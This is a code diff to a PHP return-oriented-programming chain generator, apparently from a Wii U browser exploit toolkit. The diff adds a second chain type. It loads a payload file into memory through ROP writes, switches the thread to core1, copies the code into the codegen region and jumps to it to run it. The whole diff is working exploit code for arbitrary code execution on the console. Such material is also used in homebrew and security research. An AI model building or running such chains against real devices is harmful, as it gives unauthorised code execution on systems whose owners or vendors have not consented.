@@ -113,6 +113,10 @@ function generate_ropchain()
 	{
 		generateropchain_type1();
 	}
+    else if ($ropchainselect==2)
+    {
+        generateropchain_type2();
+    }
 
 	if($generatebinrop==0)$ROPCHAIN.= "\"";
 }
@@ -404,6 +408,24 @@ function ropgen_switchto_core1()
 	ropchain_appendu32(0x0);
 }
 
+function ropgen_writerop_toAddress($payload_srcaddr){
+    global $wiiuhaxxcfg_payloadfilepath;
+        
+    $actual_payload = file_get_contents($wiiuhaxxcfg_payloadfilepath);
+	if($actual_payload === FALSE || strlen($actual_payload) < 4) die("-1: Failed to load payload");
+
+	$len = strlen($actual_payload);    
+	
+	while($len & 0x3){
+		$actual_payload.= pack("C*", 0x00);
+		$len = strlen($actual_payload);
+	}
+    
+    for($i = 0; $i < $len; $i +=4) {
+        ropgen_writeword_tomem(hexdec (bin2hex (substr($actual_payload, $i, 4))),$payload_srcaddr + $i);
+    }
+}
+
 function generateropchain_type1()
 {
 	global $ROP_OSFatal, $ROP_Exit, $ROP_OSDynLoad_Acquire, $ROP_OSDynLoad_FindExport, $ROP_os_snprintf, $payload_srcaddr, $ROPHEAP, $ROPCHAIN;
@@ -443,6 +465,27 @@ function generateropchain_type1()
 	ropgen_copycodebin_to_codegen($codegen_addr, $payload_srcaddr, $payload_size);
 	ropgen_pop_r24_to_r31($regs);
 	ropchain_appendu32($codegen_addr);
+}
+
+// The rop may get quite big here.
+function generateropchain_type2(){
+    global $payload_srcaddr, $ROPHEAP, $ROPCHAIN;
+    
+    $payload_size = 0x20000;
+	$codegen_addr = 0x01800000;
+    //$payload_srcaddr must be defined by the code including this .php.
+        
+    // Write payload from file to
+    ropgen_writerop_toAddress($payload_srcaddr);
+        
+    //When running under internetbrowser, only core1 is allowed to use codegen. Switch to core1 just in case this thread isn't on core1(with some exploit(s) it may already be one core1, but do this anyway). OSSetThreadAffinity() currently returns an error for this, hence this codebase is only usable when this ROP is already running on core1.
+    ropgen_switchto_core1();
+    
+    // Copy to codegen
+    ropgen_copycodebin_to_codegen($codegen_addr, $payload_srcaddr, $payload_size);
+    
+    // Go!
+    ropchain_appendu32($codegen_addr);
 }
 
 ?>
